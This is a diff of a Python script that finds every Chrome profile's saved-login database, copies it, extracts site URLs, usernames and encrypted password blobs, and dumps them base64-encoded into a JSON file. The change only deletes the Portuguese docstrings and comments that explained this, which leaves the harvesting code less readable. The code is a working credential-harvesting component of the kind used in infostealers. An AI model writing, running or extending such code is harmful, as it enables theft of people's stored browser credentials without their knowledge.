@@ -6,10 +6,6 @@ import sqlite3
 import tempfile
 
 def find_chrome_profiles() -> list[tuple[str, str]]:
-    """
-    Retorna lista de perfis (nome, caminho_para_Login Data) em:
-    %LOCALAPPDATA%/Google/Chrome/User Data/{Default,Profile *}/Login Data
-    """
     base = os.path.join(
         os.environ["USERPROFILE"],
         "AppData", "Local", "Google", "Chrome", "User Data"
@@ -23,14 +19,9 @@ def find_chrome_profiles() -> list[tuple[str, str]]:
     return profiles
 
 def collect_encrypted_logins() -> dict:
-    """
-    Varre todos os perfis do Chrome e retorna um dicionário com
-    perfil, site, usuário e senha criptografada em Base64.
-    """
     result = []
     profiles = find_chrome_profiles()
     for profile_name, db_path in profiles:
-        # copia para evitar bloqueio
         tmp_db = os.path.join(tempfile.gettempdir(), f"{profile_name}_LoginData.db")
         shutil.copy2(db_path, tmp_db)
 
@@ -40,7 +31,6 @@ def collect_encrypted_logins() -> dict:
         rows = cursor.fetchall()
 
         for origin_url, username, pwd_blob in rows:
-            # pwd_blob provavelmente já é bytes; encode em base64
             pwd_b64 = base64.b64encode(pwd_blob).decode('ascii')
             result.append({
                 "profile": profile_name,
@@ -56,9 +46,6 @@ def collect_encrypted_logins() -> dict:
     return {"logins": result}
 
 def save_logins_to_file(data, filename="chrome_logins.json"):
-    """
-    Salva os dados de logins no arquivo JSON.
-    """
     with open(filename, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=2, ensure_ascii=False)
 
